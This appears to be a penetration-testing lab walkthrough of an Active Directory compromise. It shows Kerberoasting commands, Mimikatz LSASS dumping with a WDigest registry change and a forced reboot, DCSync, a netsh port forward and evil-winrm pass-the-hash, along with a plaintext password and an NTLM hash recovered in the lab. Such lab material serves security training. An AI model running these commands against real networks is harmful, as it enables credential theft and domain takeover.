Phase 2 — Kerberoasting
Enumerate SPNs → extract TGS hash → crack offline
Target service accounts with weak passwords

Kerberoasting

What it is: Any domain user can request a Kerberos TGS ticket for any service with an SPN. The ticket is encrypted with the service account's password hash. We crack it offline — no lockouts, no alerts.

Invoke-KerberoastsetspnhashcatPowerView

Step 1 — Find SPNs:

setspn -T inlanefreight.local -Q */*

Step 2 — Pull TGS hash:

Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat

Step 3 — Crack offline:

hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

Why it works: Service accounts often have weak, human-chosen passwords. The Kerberos protocol allows any authenticated user to request tickets — by design.

Phase 4 — Credential hunting
Mimikatz → dump plaintext creds from LSASS
Enable WDigest if needed, extract domain user password

Mimikatz — credential extraction

What it is: Mimikatz reads the LSASS (Local Security Authority Subsystem) process memory to extract credentials. LSASS handles authentication — passwords, hashes, and tickets pass through it.

mimikatzWDigestLSASS

Run Mimikatz:

mimikatz.exe privilege::debug sekurlsa::logonpasswords

If passwords show blank — enable WDigest + reboot:

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 shutdown.exe /r /t 0 /f

WDigest explained: Old Windows auth protocol that stores plaintext passwords in LSASS. Disabled by default since Win 8.1/2012R2. Re-enabling it + forcing a user to re-authenticate = plaintext creds in memory.

Found: tpetty / Sup3rS3cur3D0m@inU2eR

Phase 5 — Privilege escalation
Enumerate ACLs → find DCSync rights
Discovered user has replication permissions on domain object

ACL enumeration → DCSync rights

What happens: We enumerate tpetty's permissions in AD and discover they have Replicating Directory Changes + Replicating Directory Changes All — the two permissions needed for DCSync.

PowerViewBloodHound

Enumerate ACLs:

Import-Module .\PowerView.ps1 $sid = Convert-NameToSid tpetty Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

What to look for:

• DCSync: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
• GenericAll: Full control over an object (reset passwords, add to groups)
• WriteDACL: Can modify ACLs — grant yourself any permission
• AddMember: Can add users to groups (e.g., Domain Admins)

Phase 6 — Domain compromise
DCSync → PtH → domain admin on DC01
Extract admin NTLM hash, pass-the-hash to domain controller

DCSync → Pass-the-Hash → domain admin

DCSync: Mimikatz impersonates a Domain Controller and uses the AD replication protocol (MS-DRSR) to request the password hash of any account. No need to touch LSASS on the DC.

Evil-WinRM: A Ruby tool for remote management via WinRM (port 5985). Supports Pass-the-Hash — authenticate with an NTLM hash instead of a plaintext password.

mimikatz DCSyncevil-winrmnetsh portfwd

Step 1 — Run as tpetty:

runas /user:INLANEFREIGHT\tpetty powershell.exe

Step 2 — DCSync:

mimikatz.exe privilege::debug lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

Step 3 — Port forward to DC01:

netsh.exe interface portproxy add v4tov4 listenport=6666 listenaddress=<WEB01_IP> connectport=5985 connectaddress=172.16.6.3

Step 4 — Pass-the-Hash:

evil-winrm -i <WEB01_IP> --port 6666 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0

Why PtH works: NTLM authentication only needs the hash, not the password. The protocol sends a challenge → the client encrypts it with the hash → the server verifies. The plaintext password is never transmitted.
